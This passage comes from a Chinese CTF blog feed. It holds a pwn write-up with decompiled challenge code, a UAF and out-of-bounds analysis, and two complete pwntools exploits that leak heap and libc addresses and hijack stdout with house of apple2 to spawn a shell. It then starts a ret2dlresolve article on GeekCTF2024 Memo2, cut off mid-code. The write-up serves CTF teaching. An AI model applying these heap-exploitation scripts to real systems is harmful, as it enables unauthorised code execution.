[rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v6[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">2LL</span>;</span><br><span class="line">  v3 = (__int64 *)retaddr;</span><br><span class="line">  init1(retaddr);                               <span class="comment">// 又产生了两个chunk</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(v3, a2);</span><br><span class="line">    a2 = &amp;v5;                                   <span class="comment">// 把一个栈地址传给了一个环境变量？</span></span><br><span class="line">    v3 = (__int64 *)&amp;choice;</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v5);              </span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      edit();                                   <span class="comment">// 下标越界，UAF，但是函数结束之后edit函数里申请的chunk全部会被释放掉，虽然有uaf依然可以访问到。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v6;</span><br><span class="line">      show(v6);                                 <span class="comment">// 把2这个数字传了进去,最多只能show两次，每次会减一</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">LABEL_9:</span><br><span class="line">      v3 = (__int64 *)<span class="string">&quot;Wrong.&quot;</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_13E0();</span><br><span class="line">  <span class="keyword">return</span> RFG_chk(retaddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1(retaddr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(&amp;choice, &amp;v1);</span><br><span class="line">  v2 = chunk_list[v1];                          <span class="comment">// 没有下标检查</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;msg: &quot;</span>);</span><br><span class="line">  myread(*(_QWORD *)(v2 + <span class="number">8</span>));                  <span class="comment">// 会写到init1中申请的第二个chunk</span></span><br><span class="line">  RFG_chk(retaddr);                             <span class="comment">// 每次RFG（检查返回地址是否被篡改）会删除最后面的两个chunk。也就是myread里调用的那个init1</span></span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">show</span><span class="params">(_QWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init1((__int64)retaddr);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --*a1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;choice, &amp;v2);</span><br><span class="line">    v3 = chunk_list[v2];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=== shadow msg ===&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)(v3 + <span class="number">8</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t look anymore!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  RFG_chk(retaddr);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>很显然程序有UAF漏洞，所以可以通过tcache attack泄露堆地址和libc地址。这边详细讲讲泄露libc地址。程序每次申请堆块一定是两两申请，并且每个大小都是0x20固定。edit和show函数都是对每次申请的第二个chunk进行操作。准确来说，是从第一个chunk中取第二个chunk的地址，并进行操作。我们逐步分析。</p><p>程序初始执行到菜单时heap分布如下：<img src="https://c-lby.top/images/2024deadsec_wp/%E7%A8%8B%E5%BA%8F%E5%88%9D%E5%A7%8Bheap.png" alt="程序初始heap"></p><p>0x290处的chunk在chunklist中下标为0，如果对其进行操作，比如show，那么就会打印出红框框起来的地址处的内容，对应第二个chunk，然后这个chunk是不在chunklist中的。同理，0x2d0处的chunk在list中，但是操作的是0x300处。</p><p>那么泄露堆地址的思路很简单，只要有chunk被释放进tcachebin，被释放chunk的fd处就会有加密后的堆地址<img src="https://c-lby.top/images/2024deadsec_wp/%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="泄露堆地址">。</p><p>我们经过一个edit操作之后，会多了两组被释放的chunk。红框对应的地址在list中下标为2，会泄露出来绿色框地址处的堆地址。记得解密。</p><p>然后我们劫持一个chunk的[1]处，edit修改为堆地址+0x2a0，show被劫持的那个chunk我们就能泄露main_areana附近的地址了。</p><p>因为chunklist在bss段，并且可以下标越界，所以选择打到stderr，劫持stdout的FILE进行house of apple2。apple2的相关内容在另一篇文章详细展开记录。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    r.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;=== shadow msg ===\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c</span>):</span><br><span class="line">    key = p8(c[<span class="number">0</span>] ^ <span class="number">0x60</span>)</span><br><span class="line">    key += p8(c[<span class="number">1</span>] ^ (((key[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | <span class="number">0x3</span>))</span><br><span class="line">    key += p8(c[<span class="number">2</span>] ^ (((key[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">0</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">3</span>] ^ (((key[<span class="number">2</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key += p8(c[<span class="number">4</span>] ^ (((key[<span class="number">3</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xff</span>) | (key[<span class="number">2</span>] &gt;&gt; <span class="number">4</span>)))</span><br><span class="line">    key = u64(key.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    heap = key &lt;&lt; <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露堆地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap_c = r.recv(<span class="number">6</span>)</span><br><span class="line">heap = decrypt(heap_c)</span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(heap+<span class="number">0x2a0</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x29d90</span></span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + <span class="number">0x21ca70</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *$rebase(0x12E3)&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>然后Qanux师傅给出了一个利用stdout泄露libc的非预期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line"><span class="comment">#         env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;node5.buuoj.cn&#x27;,29746)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, msg</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;msg:&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    p.sendline(msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cry</span>):</span><br><span class="line">    ans = cry</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        ans = (ans &gt;&gt; <span class="number">12</span>) ^ cry</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># p = process([&quot;./ld-linux-x86-64.so.2&quot;, &quot;./pwn&quot;],</span></span><br><span class="line">    <span class="comment">#             env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">    p = process(<span class="string">&#x27;./prob&#x27;</span>)</span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x5d</span>+p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>), timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(leak)[-<span class="number">2</span>] != <span class="string">&#x27;2&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">1</span>] != <span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> <span class="built_in">hex</span>(leak)[-<span class="number">3</span>] != <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;leak libc error&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">    libc_base = leak - <span class="number">0x219B20</span></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">    fake_file = flat(&#123;</span><br><span class="line">        <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">        <span class="number">0x8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0x28</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">        <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),</span><br><span class="line">        <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x40</span>),</span><br><span class="line">        <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] - <span class="number">0x20</span>),</span><br><span class="line">    &#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    edit(-<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x5d</span>+fake_file)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="0x03-User-management"><a href="#0x03-User-management" class="headerlink" title="0x03 User_management"></a>0x03 User_management</h3>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『ret2dlresolve』hijack l_addr(GeekCTF2024 Memo2)</title>
      <link href="/2024/ret2dl-hijack-l-addr/"/>
      <url>/2024/ret2dl-hijack-l-addr/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本来这篇文章想5月份写的，拖到了现在。其实是之前在VN面试的时候Qanux师傅给我做的几道题里的其中一道要用到这个技术，也是第一次见，所以打算记录一下。后来题目做了三天，才发现是24年geekCTF的memo2。接下来就从这道题讲讲劫持l_addr绕过栈溢出检测或者getshell的思路，以及调试方法。</p><h3 id="0x01-题目"><a href="#0x01-题目" class="headerlink" title="0x01 题目"></a>0x01 题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_1614(a1, a2, a3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;===================Memo Login===================&quot;</span>);</span><br><span class="line">  login();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)sub_195C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        v4 += sub_185B(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(qword_4130);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        sub_18CC(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">memset</span>(qword_4130, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sub_1A19(v4);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span 